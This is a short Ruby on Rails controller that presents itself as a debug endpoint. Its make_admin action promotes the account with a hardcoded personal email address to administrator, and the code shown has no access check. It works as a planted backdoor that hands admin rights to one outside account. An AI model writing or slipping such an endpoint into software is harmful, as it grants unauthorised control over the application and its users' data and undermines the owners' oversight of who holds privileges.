class Api::DebugController < ApplicationController
  def make_admin
    user = User.find_by(email: "cafalova@gmail.com")
    user.update!(admin: true)
  end
end
